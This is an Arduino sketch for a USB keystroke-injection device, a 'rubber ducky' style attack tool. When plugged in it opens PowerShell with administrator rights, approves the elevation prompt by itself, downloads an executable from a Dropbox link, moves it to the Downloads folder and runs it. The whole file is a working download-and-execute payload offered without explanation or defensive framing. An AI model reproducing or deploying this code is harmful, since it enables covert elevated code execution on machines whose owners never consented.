#include "Keyboard.h"

void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  Keyboard.begin();
  delay(1200);

  // Open PowerShell as Administrator
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1200);
  Keyboard.print(F("powershell Start-Process powershell -Verb runAs"));
  typeKey(KEY_RETURN);

  delay(2000);

  // Allow PowerShell execution
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(2000);

  // Download file from Dropbox
  Keyboard.print(F("$down = New-Object System.Net.WebClient; "));
  Keyboard.print(F("$url = 'https://www.dropbox.com/scl/fi/uja9bbnec73k0qmoafow5/WpfApp4.exe?rlkey=ygefc9yymhpq5z16qj5mkrqrt&st=gd7ra5lc&dl=1'; "));
  Keyboard.print(F("$file = 'WpfApp4.exe'; "));
  Keyboard.print(F("$down.DownloadFile($url,$file); "));
  typeKey(KEY_RETURN);
  delay(4000); // Allow time for download

  // Move downloaded file to Downloads folder
  Keyboard.print(F("Move-Item -Path $file -Destination \"$env:USERPROFILE\\Downloads\\$file\" -Force"));
  typeKey(KEY_RETURN);
  delay(2000);

  // Execute the downloaded file from Downloads folder
  Keyboard.print(F("Start-Process \"$env:USERPROFILE\\Downloads\\$file\""));
  typeKey(KEY_RETURN);
  delay(2000);

  // Close PowerShell
  Keyboard.print(F("exit"));
  typeKey(KEY_RETURN);
  delay(2000);

  // End keyboard stream
  Keyboard.end();
}

void loop() {}
